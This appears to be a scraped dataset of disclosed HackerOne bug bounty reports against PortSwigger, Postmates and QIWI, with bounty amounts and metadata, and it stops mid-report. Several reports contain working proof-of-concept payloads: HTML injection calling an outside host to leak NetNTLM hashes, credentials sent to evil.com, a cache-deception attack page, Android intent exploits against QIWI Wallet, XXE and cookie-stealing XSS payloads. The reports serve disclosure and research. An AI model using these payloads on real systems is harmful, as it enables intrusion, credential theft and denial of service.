At a minimum, all of these code locations where artifacts are downloaded from an untrusted source needs to be fixed. Previous releases should be rebuilt with the fix applied. The checksum of the released artifacts and artifacts built in a trusted environment should be made. If the checksums match, you can be certain that they weren't compromised.
If the checksums don't match, indicating a compromised artifact, CVE numbers need to be issued for the potentially malicious artifacts.
The ability to check if checksums match assume that these projects have reproducible builds.
Steps To Reproduce:

Cone the Impacted Project
Change this line in Dilettante so it is targeting the repository used in the build.
https://github.com/mveytsman/dilettante/blob/master/dilettante.py#L143
Start Dilettante on your local machine.
Proxy the HTTP traffic for the build through Dilettante
Execute the Build's tests.
You should be greeted with the image of a cat.

Other Places to Look
Given how widely I'm finding this vulnerability externally, I'd advise that the Port Swigger Security team take some time to also analyze their internal infrastructure for similar vulnerabilities.
This responsible disclosure follows Google's 90-day vulnerability disclosure policy (I'm not an employee of Google, I just like their policy).
Impact
By insecurely downloading code over an untrusted connection HTTP and executing the untrusted code inside of these JAR files as part of the unit/integration tests before a release opens these artifacts up to being maliciously compromised.
Remote code execution on a production server. Malicious compromise of build artifacts.Summary by jlleitschuhThis report was part of a 4 month research project into the general supply chain security of the JVM ecosystem. This vulnerability impacted organizations like the Apache Foundation, Eclipse Foundation, Elastic Search, JetBrains, Jenkins, Oracle, Google, Gradle and many other open source projects including both the Kotlin and Groovy compiler.
The full blog post about this research can be found here: Want to take over the Java ecosystem? All you need is a MITM!
In the case of BurpSuite, this vulnerability impacted the build infrastructure for their TeamCity and Jenkins Integration plugins.",https://hackerone.com/reports/506161,England,United Kingdom,Knutsford,2019,3,7,16,24
PortSwigger Web Security,11-50,0.0,1m-10m,"$1,000.00",Medium,5.45,Information Disclosure,HTML Injection in Swing can disclose netNTLM hash or cause DoS,"issuefinder  submitted a report to PortSwigger Web Security.Dec 8th (2 years ago)The vulnerability is like a SSRF but on the client side, where an attacker can force an unsolicited hidden request made by Burp Suite when the victim performs some actions.
During normal browsing to a website through Burp Suite (Pro or Community), if the website makes a request with HTML code in a GET parameter or in a POST body, and the auditor (the victim):

Intercepts that request, or
Selects that request in HTTP history (Proxy tab), or
Sends that request to repeater, or
In repeater, makes any change to the HTML code (preserving the main structure),

Burp Suite will do an unsolicited hidden request to the destination specified in the ""img"" or ""link"" HTML tags.
Next, you can see a GET and a POST example that trigger an unsolicited hidden request to ""http://www.rec2.ml/leak"" just by pasting them on a repeater tab:
GET request (using the ""img"" tag)
Code 93 BytesWrap lines Copy Download1GET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1
POST request (using the ""link"" tag)
Code 162 BytesWrap lines Copy Download1POST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1
2Content-Type: application/x-www-form-urlencoded
3
4=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
In fact, a smaller payload to produce the same behaviour can be achieved by pasting the following on a repeater tab:
Code 43 BytesWrap lines Copy Download1?=<html><img+src='http://www.rec2.ml/leak'>
Impact
An attacker can exploit this vulnerability in at least 4 different ways:
##1. Real public IP address leak
The unsolicited hidden request does not respect the configuration in User options tab:

Upstream Proxy Servers
SOCKS proxy

An auditor (the victim), trying to hide his real public IP address from an audited website (using an upstream proxy server or a SOCKS proxy), would be leaking it without being aware of this fact.
Affected OS: Linux, MacOS, Windows
PoC video: burpsuite_leak_vuln-leak.mp4
##2. Windows NetNTLM hashes leak
If the HTML code uses the “file://” scheme instead of the “http[s]://” , it will produce an unsolicited hidden request using the SMB protocol that will negotiate and leak the auditor's:

Username
Computer name or domain
NetNTLM hash

The NetNTLM can be cracked and therefore used at a later stage.
To negotiate and get the NetNTLM hash an attacker can use Responder (https://github.com/lgandx/Responder).
Affected OS: Windows
PoC video: burpsuite_leak_vuln-netntlm.mp4
##3. RCE on other machines
To perform this attack in the best scenario, an attacker must be on the same internal network with network visibility with the victim (auditor).
This attack is a variant of the previous one (2. Windows NetNTLM hashes leak) in which, instead of cracking the NetNTLM hash, the attacker does a MiTM to relay the SMB negotiation to other machines (without SMB signing enabled) and obtain a RCE in the context of the victim.
The HTML code must also use the “file://” scheme instead of the “http[s]://” , to produce an unsolicited hidden request using the SMB protocol.
To relay the SMB negotiation an attacker can use ntlmrelayx (https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py).
Affected OS: Windows
PoC video: burpsuite_leak_vuln-rce.mp4
##4. Denial of Service (DoS).
If the attacker does not respond to the unsolicited hidden request made by Burp Suite and keeps the TCP connection open, then it can freeze Burp Suite execution, forcing the auditor (victim) to lose the unsaved changes.
Affected OS: Linux, MacOS, Windows
PoC video: burpsuite_leak_vuln-dos.mp44 attachments:F1109393: burpsuite_leak_vuln-leak.mp4F1109394: burpsuite_leak_vuln-netntlm.mp4F1109395: burpsuite_leak_vuln-dos.mp4F1109396: burpsuite_leak_vuln-rce.mp4",https://hackerone.com/reports/1054382,England,United Kingdom,Knutsford,2020,12,8,21,45
PortSwigger Web Security,11-50,0.0,1m-10m,$200.00,Low,2.0,Information Disclosure,Leak of Platform Authentication credentials via Repeater,"jupenur  submitted a report to PortSwigger Web Security.Jan 5th (5 years ago)Burp Repeater leaks Platform Authentication (HTTP Basic) credentials when following redirections.
Steps to reproduce:

Set up an open redirection on a site you control (example.com).
Set up Platform Authentication for that same site. Use HTTP Basic auth and whatever credentials.
Using Repeater, issue a request to the page with the open redirection:

Code 67 BytesWrap lines Copy Download1GET /redirect.php?url=http://evil.com HTTP/1.1
2Host: example.com
3
4 

Click on the Follow redirection button
Observe, helpless, as your HTTP Basic credentials are sent to evil.com:

Code 80 BytesWrap lines Copy Download1GET http://evil.com/ HTTP/1.1
2Host: evil.com
3Authorization: Basic dXNlcjpwYXNz
4
5
Note that there's nothing ""unusual"" about the steps to reproduce this, so it can easily happen completely by accident. On the attacker's side, exploiting this only requires logging any incoming Authorization headers.
Impact
Burp Suite users may inadvertently send Platform Authentication credentials to unrelated third parties. This is fundamentally very sensitive information, making this a rather nasty leak.",https://hackerone.com/reports/302651,England,United Kingdom,Knutsford,2018,1,5,13,30
PortSwigger Web Security,11-50,0.0,1m-10m,"$1,000.00",Medium,5.45,Cryptographic Issues - Generic,SMTP interaction theft via MITM,"duesee  submitted a report to PortSwigger Web Security.Aug 7th (2 years ago)See http://www.postfix.org/CVE-2011-0411.html for adetailled description.
Impact
MitM could obtain user credentials.1 attachment:F939671: buftest.py",https://hackerone.com/reports/953219,England,United Kingdom,Knutsford,2020,8,7,11,29
PortSwigger Web Security,11-50,0.0,1m-10m,$350.00,No value,0.0,Cross-site Scripting (XSS) - Generic,XSS in IE11 on portswigger.net via Flash,"opnsec  submitted a report to PortSwigger Web Security.Nov 14th (6 years ago)Hello Portswigger Security Team,
There is a reflective XSS vulnerability in portswigger.net. The flash file https://portswigger.net/burp/tutorials/video-js/video-js.swf is from an old video.js library (version 3.2.0) which is vulnerable to XSS.
This XSS will be blocked by CSP instruction object-src https://portswigger.net/knowledgebase/papers/; but it will execute on browsers that don't enforce this CSP like Internet Explorer 11.
POC link : https://portswigger.net/burp/tutorials/video-js/video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
POC instructions :

Open the POC link in Internet Explorer 11 with flash active
The javascript payload executes in https://portswigger.net
(Tested on Windows 10)

Mitigation :
To solve this issue, replace the old https://portswigger.net/burp/tutorials/video-js library with the updated video.js library from http://videojs.com/. It is also better to host any swf file on a sandbox subdomain.
Regards,
Enguerran @opnsec1 attachment:F134728: Portswigger_XSS.png",https://hackerone.com/reports/182160,England,United Kingdom,Knutsford,2016,11,14,21,7
Postmates,5001-10000,0.0,50m-100m,$500.00,High,8.2,Violation of Secure Design Principles,Web cache poisoning attack leads to user information and more,"davidalbert  submitted a report to Postmates.Feb 8th (4 years ago)Hello,
Your Web-Server is vulnerable to web cache poisoning attacks.
This means, that the attacker are able to get another user informations.
If you are logged in and visit this website (For example):
https://postmates.com/SomeRandomText.css
Then the server will store the information in the cache, BUT with the logged in user information :)
A non-logged-in user can then visit this website and see the information contained therein.
In that case, this url: https://postmates.com/SomeRandomText.css
I have written a small javascript / html code, which executes this attack fully automated, you just need to visit the website and wait like 3 seconds.
Here is the small PoC code
Code 913 BytesWrap lines Copy Download1<html>
2<head>
3</head>
4<body>
5<script>
6    var cachedUrl = 'https://postmates.com/' + generateId() + '.css';
7    const popup = window.open(cachedUrl);
8
9    function generateId() {
10        var content = '';
11        const alphaWithNumber = 'QWERTZUIOPASDFGHJUKLYXCVBNM1234567890';
12
13        for (var i = 0; i < 10; i++) {
14            content += alphaWithNumber.charAt(Math.floor(Math.random() * alphaWithNumber.length))
15        }
16        return content;
17    }
18
19    var checker = setInterval(function() {
20        if (popup.closed) {
21            clearInterval(checker);
22        }
23    }, 200);
24    var closer = setInterval(function() {
25        popup.close();
26        document.body.innerHTML = 'Victims content is now cached <a href=""' + cachedUrl + '"">here and the url can be saved on the hackers server</a><br><b>Full Url: ' + cachedUrl + '</b>'; 
27        clearInterval(closer);
28    }, 3000);
29
30</script>
31</body>
32</html>
Theoretically, the attacker could then store this information on his server, but in this example, the URL is simply shown.
I would suggest keeping an eye on caching for more security and hope you enjoyed my report.
Some informations about the attack:
https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf
The screenshots with the steps are in the attachments
Not important for this report, but i want to look deeper in your website: Can you create an account for me? Im from Germany and dont have american phone number :)
Impact
Web cache poisoning attack can be used to steal user informations like lastname and member id which is important for the login security feature. (For example)7 attachments:F420274: 1_Logged_in_(Normal).pngF420275: 2_Logged_in_(Normal).pngF420276: 3_Not_Logged_in_(Private_Mode).pngF420277: 4_Not_Logged_in_(Private_Mode).pngF420278: 5_Logged_in_Victim_visits_attackers_website_(Normal).pngF420279: 6_Everyone_can_see_the_logged_in_content_on_this_website_(Private_Mode).pngF420281: 7_Attacker_can_get_important_informations_(Private_Mode).png",https://hackerone.com/reports/492841,California,United States,San Francisco,2019,2,8,11,3
QIWI,1001-5000,0.0,200m-1b,$150.00,Medium,5.45,Violation of Secure Design Principles,[ibank.qiwi.ru] UI Redressing via Request-URI,bobrov  submitted a report to QIWI.Aug 29th (6 years ago),https://hackerone.com/reports/164153,Moscow,Russia,Moscow,2016,8,29,12,37
QIWI,1001-5000,0.0,200m-1b,$200.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[ishop.qiwi.com] XSS + Misconfiguration,"kxyry  submitted a report to QIWI.Feb 12th (8 years ago)Хост - ishop.qiwi.com
Тип - XSS
Как воспроизвести
1) Регистрируем новый магазин с именем ""><script> наш код  </script>
http://puu.sh/fOHix/537dacd4cc.png
http://puu.sh/fOHl5/a287e79250.png
http://puu.sh/fOHoJ/0ec66e9f4d.png
2) Привязываем номер телефона
http://puu.sh/fOHxf/d52b555777.png
3) Страница сообщает нам что наш номер не идентифицирован
http://puu.sh/fOIT7/da678d5d09.png
4) Но зная url переходил по ссылке  - misconfiguration
https://ishop.qiwi.com/pays/transfer.action
получаем выполнение произвольного javascript кода 
http://puu.sh/fOHEv/32c04be367.png
Рекомендации по устранению
фильтрация специальных символов "" <> ' 
 Знаю что импакт от этой  XSS возможен только в случае социльной инженерии, так как на ishop.qiwi.com реализована защита от CSRF атак на login  

С наилучшими пожеланиями , Kxyry",https://hackerone.com/reports/47536,Moscow,Russia,Moscow,2015,2,12,13,9
QIWI,1001-5000,0.0,200m-1b,$500.00,High,7.95,Privilege Escalation,[QIWI Wallet] Access to protected app components ,"shell_c0de  submitted a report to QIWI.Jan 20th (4 years ago)Здравствуйте, я хочу сообщить об обнаруженной уязвимости в классе ru.mw.main.Main
Информация о приложении
Приложение: QIWI Кошелек
Имя пакета: ru.mw
Номер версии: 3.25.0
Код версии: 21346
Актуальность версии: Последняя
Уязвимый класс: ru.mw.main.Main
Уязвимость
Поскольку активность ru.mw.Main экспортирована, можно отправить intent в класс ru.mw.main.Main там есть уязвимый метод onResume()
Code 1.16 KiBWrap lines Copy Download1public class Main extends QiwiPresenterActivity<a, ru.mw.main.b.a> implements AccountManagerCallback<Bundle>, OnCloseListener, OnQueryTextListener, OnSuggestionListener, ru.mw.authentication.a.a, ru.mw.main.c.a {
2...
3public void onResume() {
4        super.onResume();
5        Class cls = getClass();
6        StringBuilder stringBuilder = new StringBuilder();
7        stringBuilder.append(""MAIN: "");
8        stringBuilder.append(Thread.currentThread().getStackTrace()[2].getMethodName());
9        Utils.a(cls, stringBuilder.toString());
10        ((ru.mw.main.b.a) aS_()).a();
11        CharSequence stringExtra = getIntent().getStringExtra(FCMIntentHandlerActivity.b);
12        Intent intent = (Intent) getIntent().getParcelableExtra(FCMIntentHandlerActivity.c);//NEXT_INTENT
13        if (Utils.a(intent)) {
14            startActivity(intent);//start malicious intent
15        } else if (!TextUtils.isEmpty(stringExtra)) {
16            if (intent != null) {
17                TextDialog.a(stringExtra, intent).a(getSupportFragmentManager(), C());//start malicious intent
18            } else {
19                TextDialog.a(stringExtra).a(getSupportFragmentManager(), C());
20            }
21        }
22
Метод onResume() позволяет запускать intent злоумышленника , с помощью данной уязвимости можно получить доступ к защищённым компонентам приложений такие как активности, контент-провайдеры, которые недоступны для внешних приложений и содержат android:exported=""false"" 
PoC
PoC 1 - Чтение файлов в папке /data/data/ru.mw без root
Code 523 BytesWrap lines Copy Download1  Intent next = new Intent(""android.intent.action.VIEW"", Uri.parse(""qiwi://promo.web?url=https://xssvenmo.biz/mer.php""));
2        next.setClassName(""ru.mw"",""ru.mw.WebInfoActivity"");
3        next.putExtra(""InfoActivity_extra_url"",""file:///data/data/ru.mw/shared_prefs/ru.mw_preferences.xml"");
4
5        Intent intent = new Intent();
6        intent.setClassName(""ru.mw"",""ru.mw.Main"");
7        intent.putExtra(""gcm_intent"", next);
8        intent.putExtra(""intent_extra_data_key"",""45 /ryyhr/nkj"");
9        startActivity(intent);
PoC 2 - Get Permission   <uses-permission android:name=""android.permission.CAMERA""/>
Code 557 BytesWrap lines Copy Download1    Intent next =  new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
2        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
3        next.putExtra(MediaStore.EXTRA_OUTPUT, Uri.parse(""content://ru.mw.provider/files/416.jpg""));
4
5        Intent intent = new Intent();
6        intent.setClassName(""ru.mw"",""ru.mw.Main"");
7        intent.putExtra(""gcm_intent"", next);
8        intent.putExtra(""gcm_body"", ""Идентификация\n\nПодтвердите личность, сделайте селфи!!!!!"");
9        intent.putExtra(""intent_extra_data_key"",""45 /ryyhr/nkj"");
10        startActivity(intent);
Ваше приложение разрешает пользоваться камерой другому приложения, которое не имеет на это разрешение. Так же можно вывести уведомление для прохождения идентификации и попросить сделать фотографию от лица вашего приложения, затем сохранить фотографию в защищённый контент-провайдер приложения, все эти действия будет выполнять приложение QIWI кошелёк.
Уязвимость включена в Google Play Security Reward Program (Раздел 3 «Access to protected app components»)
PoC 3 - Получение доступа к защищённому контент-провайдеру приложения
Code 643 BytesWrap lines Copy Download1  Intent next =  new Intent(""android.intent.action.VIEW"");
2        next.setClassName(getPackageName(),getPackageName()+"".TheftData"");
3        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
4        next.setData(Uri.parse(""content://ru.mw.provider/files/416.jpg""));
5        next.putExtra(""keepAliveActivity"",true);
6        Intent intent = new Intent();
7        intent.setClassName(""ru.mw"",""ru.mw.Main"");
8        intent.putExtra(""gcm_intent"", next);
9        intent.putExtra(""gcm_body"", ""Получить доступ к защищённому провайдеру приложения?"");
10        intent.putExtra(""intent_extra_data_key"",""45 /ryyhr/nkj"");
11        startActivity(intent);
С помощью данной уязвимость злоумышленник может получить доступ к провайдеру android.support.v4.content.FileProvider и его файлам. В качестве примера, я разрешаю вредоносному приложению прочитать фотографию, которая была сделана ранее (см. PoC 2) и сохранена в контент-провайдере.
PoCHinQ.jpg (F409689)
PoCProvider.jpg (F409714)
PoC 4 - Отправка SMS для подтверждения перевода
Code 787 BytesWrap lines Copy Download1 Intent next =  new Intent(""android.intent.action.VIEW"");
2        next.setData(Uri.parse(""smsto:QIWIWallet""));
3        next.putExtra(""sms_body"", ""HackerOne"");
4        Intent intent = new Intent();
5        intent.setClassName(""ru.mw"",""ru.mw.Main"");
6        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
7                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
8                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
9                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);
10        intent.putExtra(""gcm_intent"", next);
11        intent.putExtra(""gcm_body"", ""Подтвердите платеж\n\nМы отправили SMS, подтвердите отправку платежа, ответив на него"");
12        intent.putExtra(""intent_extra_data_key"",""45 /ryyhr/nkj"");
13        startActivity(intent);
В приложении QIWI Кошелек есть функционал при котором требуется отправить sms на определённый номер чтобы подтвердить перевод. Поскольку после нажатия кнопки подтверждения в TextDialog отправляется Intent то можно заставить пользователя отправить sms на номер злоумышленника.
PoCSMSQiwi.jpg (F409690)
PoC 5 - Открытие WebView (Theft of insecure private data)
Code 710 BytesWrap lines Copy Download1  Intent next = new Intent(""ru.mw.action.VIEW_WEB_PAGE"", Uri.parse(""https://xssvenmo.biz/qiwi""));
2        next.setClassName(""ru.mw"",""ru.mw.WebViewActivity"");
3        Intent intent = new Intent();
4        intent.setClassName(""ru.mw"",""ru.mw.Main"");
5        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
6                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
7                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
8                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);
9        intent.putExtra(""gcm_intent"", next);
10        intent.putExtra(""gcm_body"", ""HackerOne"");
11        intent.putExtra(""intent_extra_data_key"",""45 /ryyhr/nkj"");
12        startActivity(intent);
Или
Code 768 BytesWrap lines Copy Download1     Intent next = new Intent(""android.intent.action.VIEW"", Uri.parse(""qiwi://promo.web?url=https://xssvenmo.biz/mer.php""));
2        next.setClassName(""ru.mw"",""ru.mw.WebInfoActivity"");
3        next.putExtra(""InfoActivity_extra_url"",""https://xssvenmo.biz/mer.php"");
4
5        Intent intent = new Intent();
6        intent.setClassName(""ru.mw"",""ru.mw.Main"");
7        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
8                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
9                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
10                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);
11        intent.putExtra(""gcm_intent"", next);
12        intent.putExtra(""intent_extra_data_key"",""45 /ryyhr/nkj"");
13        startActivity(intent);
В приложении есть два класса WebView которые эксплуатируются с помощью данной уязвимостью ru.mw.WebInfoActivity и ru.mw.WebViewActivity
Данный PoC позволяет заменить контент приложения на свой. В результате пользователь не сможет понять разницу между вашим приложением и контентом злоумышленника. Уязвимость включена в Google Play Security Reward Program (Раздел 2 «Theft of insecure private data»)
Воспроизведение уязвимости
Скачать/Установить: [QIWI Кошелек] (https://play.google.com/store/apps/details?id=ru.mw)
Установить Pin-код в приложении QIWI Кошелек
Предоставить разрешение для камеры вручную: GrantPermission.jpg (F409713)
Скачать/Установить: HunterExploitQIWI.apk (F409686)
Нажимать на кнопки с 1-6, желательно по порядку.
Если приложение QIWI начнёт зависать или PoC не работать, закройте приложение QIWI смахнув его из задач, и нажмите нужную PoC кнопку.
###Fix
Для исправления ошибки необходимо добавить проверку intent, а именно поверить имя пакета и класс который собираемся запускать.
Примерный код правильной проверки:
Code 471 BytesWrap lines Copy Download1ComponentName component = intent.getComponent();
2         if (component == null) {
3             return false;
4         }
5         String className = component.getClassName();
6         for (Object equals : F) {
7             if (className.equals(equals)) {
8                 return true;
9             }
10         }
11 ...
12         String package_name = intent.getPackage();
13         if (package_name.equals(string_white_pkg_name)) {
14                 return true;
15             }
Impact
Уязвимость позволяет получить доступ к защищённым компонентам приложения и управлять ими.
Можно заменить контент приложения.
Можно получить доступ к файлам приложения.
Можно воспользоваться разрешением приложения для доступа к функциям, которые требуют прав доступа.
Можно проводить фишинг атаки.
Можно программировать TextDialog5 attachments:F409686: HunterExploitQIWI.apkF409689: PoCHinQ.jpgF409690: PoCSMSQiwi.jpgF409713: GrantPermission.jpgF409714: PoCProvider.jpg",https://hackerone.com/reports/482998,Moscow,Russia,Moscow,2019,1,20,22,58
QIWI,1001-5000,0.0,200m-1b,$100.00,Low,2.0,Information Disclosure,[qiwi.com] .bash_history,bobrov  submitted a report to QIWI.Dec 10th (6 years ago),https://hackerone.com/reports/190195,Moscow,Russia,Moscow,2016,12,10,20,46
QIWI,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[qiwi.com] /oauth/confirm.action XSS,"akhil-reni  submitted a report to QIWI.Nov 17th (8 years ago)Hey hi,
I have found a XSS in oauth2 
vulnerable link: https://qiwi.com/oauth/confirm.action?redirect=javascript:alert(1);/////&clientId=kav_subscribe
steps to reproduce:
1) open the following link https://qiwi.com/oauth/confirm.action?redirect=javascript:alert(1);/////&clientId=kav_subscribe
2) click Вернуться на сайт магазина
3) you will a alert on the browser.
Vulnerable parameter: redirect=
payload: javascript:alert(1);/////
POC: look for attached screenshot.
Thanks,
karthik1 attachment:F20889: xssqiwi.png",https://hackerone.com/reports/36319,Moscow,Russia,Moscow,2014,11,17,12,33
QIWI,1001-5000,0.0,200m-1b,$150.00,Medium,5.45,Information Disclosure,[qiwi.com] Information Disclosure,bobrov  submitted a report to QIWI.Aug 29th (6 years ago)vankyver   changed the status to Triaged. Aug 29th (6 years ago)bobrov   updated the severity to medium. Oct 6th (6 years ago)bobrov   posted a comment. Dec 5th (6 years ago)QIWI  rewarded bobrov with a $150 bounty. Dec 16th (6 years ago)vankyver   closed the report and changed the status to Resolved. Dec 16th (6 years ago)bobrov   requested to disclose this report. Mar 1st (6 years ago)  This report has been disclosed. Mar 31st (6 years ago),https://hackerone.com/reports/164168,Moscow,Russia,Moscow,2016,8,29,13,29
QIWI,1001-5000,0.0,200m-1b,$950.00,No value,0.0,Improper Authentication - Generic,[qiwi.com] Oauth захват аккаунта,kxyry  submitted a report to QIWI.Aug 15th (6 years ago)Summary by kxyryCSRF in implementation of oAuth protocol allows attackers takeover the account of any user.,https://hackerone.com/reports/159507,Moscow,Russia,Moscow,2016,8,15,16,44
QIWI,1001-5000,0.0,200m-1b,$150.00,No value,0.0,Open Redirect,[qiwi.com] Open Redirect,"bobrov  submitted a report to QIWI.Dec 3rd (8 years ago)PoC (Chrome):
https://qiwi.com/main.action#/\google.com/
Уязвимый фрагмент кода:
https://static.qiwi.com/js/qiwi_com/qiwi.min.js?v=3.3.9
if(this.wc.hash&&Aa(this.wc.hash,""#/""))return this.wc.href=this.wc.hash.substring(1).replace(/^\/+/,""/""),this;",https://hackerone.com/reports/38157,Moscow,Russia,Moscow,2014,12,3,20,25
QIWI,1001-5000,0.0,200m-1b,$550.00,High,7.95,Cross-site Scripting (XSS) - Reflected,[qiwi.com] XSS on payment form,"nstikhomirov  submitted a report to QIWI.Aug 26th (5 years ago)Высылаем POST 
Code 219 BytesWrap lines Copy Download1<form action=""https://qiwi.com/payment/form/25598"" method=""POST"">
2	<input type=""text"" name=""extra['account']"" value=""(999)999-99-99'&quot;></script><font color=RED size=+15>HACKED</font>"">
3	<input type=""submit"">
4</form>
В чем дело? Символы "", %{BYTS} фильтруются, но не фильтруется / символ
Из за этого мы можем тупо закрыть скрипт при помощи </script> и писать все, что угодно
P.S. >>> Можно забайпасить X-XSS-Auditor при помощи ваших обработок %00 и тп символов :)
Что в итоге выходит? photo_2017-08-26_23-04-51.jpg (F216159)1 attachment:F216159: photo_2017-08-26_23-04-51.jpg",https://hackerone.com/reports/263684,Moscow,Russia,Moscow,2017,8,26,20,7
QIWI,1001-5000,0.0,200m-1b,$500.00,High,7.95,None,[qiwi.me] Stored XSS,"circuit  submitted a report to QIWI.Nov 12th (3 years ago)danr0   changed the status to Needs more info. Nov 13th (3 years ago)circuit   changed the status to New. Updated Nov 13th (3 years ago)danr0   changed the status to Triaged. Nov 13th (3 years ago)circuit   posted a comment. Nov 13th (3 years ago)QIWI  rewarded circuit with a $500 bounty. Nov 26th (3 years ago)circuit   posted a comment. Dec 3rd (3 years ago)danr0   closed the report and changed the status to Resolved. Dec 4th (3 years ago)circuit   requested to disclose this report. Nov 12th (2 years ago)vankyver   agreed to disclose this report. Nov 12th (2 years ago)  This report has been disclosed. Nov 12th (2 years ago)Summary by circuitХранимая ХСС в функционале вишлистов с обходом встроенного WAF. 
https://twitter.com/ptswarm",https://hackerone.com/reports/736236,Moscow,Russia,Moscow,2019,11,12,14,15
QIWI,1001-5000,0.0,200m-1b,$200.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[rubm.qiwi.com] Yui charts.swf XSS,kxyry  submitted a report to QIWI.Dec 10th (7 years ago),https://hackerone.com/reports/104488,Moscow,Russia,Moscow,2015,12,10,9,55
QIWI,1001-5000,0.0,200m-1b,"$1,000.00",No value,0.0,Denial of Service,[send.qiwi.ru] Soap-based XXE vulnerability /soapserver/ ,"bitquark  submitted a report to QIWI.Nov 17th (8 years ago)An XML external entities injection vulnerability exists on the soap server hosted on send.qiwi.ru. The attack allows an attacker to open local files (although perhaps not return the data, see below), leading at best to a DoS.
Often this attack can be used to extract files from the server (such as /etc/passwd), or even directly execute code if the PHP expect module is installed, however in this case exploitation isn't as straight forward as the issue occurs in the XML pre-check code and no user input is returned. That's not to say there isn't a away to exfiltrate data, but I haven't had time to fully investigate.
At best, this attack can be used as a denial-of-service, opening up /dev/random thousands of times until the server falls over through memory use and CPU load.
Proof-of-concept (change bitquark.co.uk to a site you control and watch the access logs; or change to file:///dev/urandom and the script will hang):
    POST /soapserver/ HTTP/1.1
Host: send.qiwi.ru
Content-Type: application/x-www-form-urlencoded
Content-Length: 254
    <?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM ""https://bitquark.co.uk/?xxe"">]>
    <SOAP-ENV:Envelope>
<SOAP-ENV:Body>
<getStatus>
<id>&xxe;</id>
</getStatus>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
You'll get the error ""DTD are not supported by SOAP"", but the attack will have succeeded.
For more information on XXE vulnerabilities in PHP in particular, see:
http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-external-entity-injectionbitquark   posted a comment. Nov 17th (8 years ago)Here's a quick cURL proof-of-concept which makes the script open /dev/random and hang:
curl -is --data $'<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM \""file:///dev/random\"">]><SOAP-ENV:Envelope><SOAP-ENV:Body><getStatus><id>&xxe;</id></getStatus></SOAP-ENV:Body></SOAP-ENV:Envelope>' https://send.qiwi.ru/soapserver/videns   changed the report title from Soap-based XXE vulnerability on send.qiwi.ru to [send.qiwi.ru] Soap-based XXE vulnerability /soapserver/ . Nov 18th (8 years ago)videns   changed the status to Triaged. Nov 18th (8 years ago)isox   closed the report and changed the status to Resolved. Nov 18th (8 years ago)QIWI  rewarded bitquark with a $1,000 bounty. Nov 18th (8 years ago)Thank's, that's a good bug :)bitquark   posted a comment. Nov 18th (8 years ago)Fix confirmed, thanks for the super quick response and reward! :-)bitquark   requested to disclose this report. Nov 18th (8 years ago)  This report has been disclosed. Dec 18th (8 years ago)",https://hackerone.com/reports/36450,Moscow,Russia,Moscow,2014,11,17,22,31
QIWI,1001-5000,0.0,200m-1b,$200.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[send.qiwi.ru] XSS at auth?login=,"psych0tr1a  submitted a report to QIWI.Nov 13th (8 years ago)
Хост - send.qiwi.ru
Тип - XSS
https://send.qiwi.ru/auth?login=""><script>alert(document.cookie)</scri
pt>&password=123&go=%D0%92%D1%85%D0%BE%D0%B4
Позволяет выпонить произвольный js а также обойти защиту от CSRF
Рекомендации по устранению - сделать фильтрацию "" ' < >",https://hackerone.com/reports/35413,Moscow,Russia,Moscow,2014,11,13,11,41
QIWI,1001-5000,0.0,200m-1b,$200.00,No value,0.0,Cross-site Scripting (XSS) - Generic,[static.qiwi.com] XSS proxy.html,"smiegles  submitted a report to QIWI.Nov 13th (8 years ago)Hi,
https://static.qiwi.com/respond/proxy.html contains a Cross-site scripting. 
Code 334 BytesWrap lines Copy Download1      query = getQueryString();
2        css = query[""css""];
3        domain = query[""url""];
4
5        if (css && domain) {
6            ajax(css, function (response) {
7                window.name = response;
8                window.location.href = domain; // this line here is vulnerable to Cross-site scripting.
9            });
10        }
As you can see, it looks if two get varables are available (css and url) if they both are it requests the css parameter through ajax and then redirects the user to the ?url variable which is vulnerable for Cross-site scripting.
POC: https://static.qiwi.com/respond/proxy.html?css=http://olivierbeg.nl/xss/xss.php&url=javascript:alert(1)
Best regards,
Olivier Beg",https://hackerone.com/reports/35363,Moscow,Russia,Moscow,2014,11,13,9,54
QIWI,1001-5000,0.0,200m-1b,$200.00,Medium,5.45,Improper Restriction of Authentication Attempts,[wallet.rapida.ru] Mass SMS flood,"bigbear_  submitted a report to QIWI.Feb 27th (6 years ago)... или сказ о том, как я опрометчиво заказал себе рассылку из 300 смс.
Шаги для воспроизведения:
1) Логинимся в wallet.rapida.ru
2) Идём в шаблоны и создаём себе шаблон для оплаты мобилы
3) Если вы до этого нигде не вводили 2FA код - то сейчас самая фишка - нас просят его ввести.
4) Ловим запрос и посылаем в интрудер:
